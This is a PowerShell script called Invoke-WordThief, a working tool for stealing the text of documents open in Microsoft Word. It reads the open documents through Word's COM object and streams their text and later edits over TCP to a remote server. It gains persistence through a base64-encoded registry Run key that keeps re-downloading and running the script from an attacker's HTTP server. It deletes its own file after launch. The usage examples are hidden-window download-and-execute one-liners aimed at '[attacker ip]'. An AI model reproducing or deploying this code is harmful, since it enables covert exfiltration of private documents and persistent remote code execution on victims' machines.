<#
    TODO:
    - clean code, add code comments and finish README (markdown)
#>

<#
.SYNOPSIS

PowerShell Microsoft Word text stealer

Author: Daniel Wolfman
https://twitter.com/DanielWolfman3
https://github.com/danielwolfmann/Invoke-WordThief

.DESCRIPTION

This script runs multithreading module that connects to a remote TCP server,
monitors active (opened) Microsoft Word documents (.doc,.docx,etc') and extracting
their text using Word application's COM Object.
The script adds HKCU registry (no admin needed) Run key, so this script runs persistently

.EXAMPLE
powershell -nop -w 1 -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1');Invoke-WordThief -Server [attacker ip]"
(Requires internet connection, Windows AMSI blocks it too)

.EXAMPLE
powershell -nop -w 1 -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://[attacker ip]/Invoke-WordThief.ps1');Invoke-WordThief -Server [attacker ip]"
Downloads the script from attacker's HTTP file server (you can use python's "http.server" module for that)

.EXAMPLE
powershell -exec bypass -w 1 -nop -enc [Base64 string, look at "powershell.exe /?" to learn how to make one]

#>

Function Wait-ForWord {
    <#
    .SYNOPSIS

    This function waits (blocking) for Microsoft Word document to be opened.
    
    #>

    Write-Host "[~] Waiting for Microsoft Word document to be opened" -ForegroundColor Gray
    
    while(1) {
        try {
            $word = ([Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application'))
            Write-Host '[+]' $word.UserName 'opened Word!' -ForegroundColor Green
            break
        }
        catch { sleep 1 }
    }
    return $word
}

Function Add-Reg {
    param($ip, $port, $log_port)
    $url = "http://" + $ip +':' + $port + "/script.ps1"
    $payload = "powershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('$url');Invoke-WordThief -Server $ip -Log_Port $log_port -HTTP_Port $port} catch{sleep 5}}"""
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $enc = [Convert]::ToBase64String($bytes)
    New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Logger" -Value "powershell -w 1 -exec bypass -nop -enc $enc" 1>$null 2>$null
}

Function Invoke-WordThief {
    <#
    .SYNOPSIS
    
    This is the main function, running all monitoring activity and multithreading (Jobs),
    defined ScriptBlock that runs the text streaming phase (after doc has been opened).

    #>
    
    param(
    [Parameter(Mandatory=$true)]
    [string]$SERVER,
    [boolean]$PERSISTENCE = $true,
    [int]$LOG_PORT = 8888,
    [int]$HTTP_PORT = 8000
    )

    # executing registry persistence
    if ($PERSISTENCE) {
        Add-Reg $SERVER $HTTP_PORT $LOG_PORT
    }

    $StreamText = {
        
        function diffstrs {param($a, $b) (Compare-Object ($a.ToCharArray()) ($b.ToCharArray()) -PassThru | where SideIndicator -eq "=>") -join "" }

        $doc_id = $args[0]
        $username = $args[1]
        $server = $args[2]
        $port = $args[3]

        try {
            $word = ([Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application'))
            $doc = ($word.Documents | where DocID -eq $doc_id)
        }
        catch { "failed to load word comobject" ; exit }

        # create TCP socket to server
        while(1) {
            try 
            {
                $socket = New-Object -TypeName System.Net.Sockets.TcpClient
                $socket.Connect($SERVER, $PORT)
                break
            }
            catch 
            {
                sleep 3
            }
        }

        # Setup stream writer 
        $Stream = $Socket.GetStream() 
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $Writer.AutoFlush = $true
    
        $data = [System.Text.UTF8Encoding]::UTF8.GetBytes($doc.Name)
        $Stream.Write($data, 0, $data.Length);
        $data = [System.Text.UTF8Encoding]::UTF8.GetBytes("`n`n--------- " + (Get-Date -Format "[dd/MM/yyyy HH:mm]") + " - " + $username + " ---------`n")
        $Stream.Write($data, 0, $data.Length);

        $content = $doc.Range().text
        $Writer.Write($content)

        while($new_content = $doc.Range().text) {
            # get diff
            $diff = diffstrs $content $new_content 
            if ($diff) {
                try {
                    $Writer.Write($diff)
                    $content = $new_content
                }
                catch { exit }
            }
        }
    }

    Get-Job | where Name -Like "monitor_*" | Stop-Job
    Get-Job | where Name -Like "monitor_*" | Remove-Job

    $active_docs_count = 0

    while (1) {

        # Wait for Word to be opened
        $word = Wait-ForWord

        # while Word has active documents opened
        while(($word.Documents.Count -gt 0)) {
            # check if new document opened
            if ($word.Documents.Count -gt $active_docs_count) {
                # iterate through all new documents
                for ($i = 1 ; $i -le ($word.Documents.Count - $active_docs_count) ; $i++) {
                    # start streaming job
                    Write-Host '[*] Starting text streaming of' $word.Documents[$i].Name -ForegroundColor Yellow
                    Start-Job -ScriptBlock $StreamText -Name ("monitor_" + $word.Documents[$i].DocID) -ArgumentList ($word.Documents[$i].DocID, $word.UserName, $SERVER, $LOG_PORT) > $null
                }
                $active_docs_count += ($word.Documents.Count - $active_docs_count)
            }
        
            # check if one of the documents has been closed
            if ($word.Documents.Count -lt $active_docs_count) {
                $active_docs_count -= 1
            }

            sleep 1
        }
    }
    
}

#if it's been executed from disk
if ($PSCommandPath -and $args.Count -gt 1) {
    # delete script file
    del $PSCommandPath 2>$null

    # run main function
    Invoke-WordThief -SERVER $args[1] -LOG_PORT $args[2] -HTTP_PORT $args[3] -PERSISTENCE (!!($args[4]))
}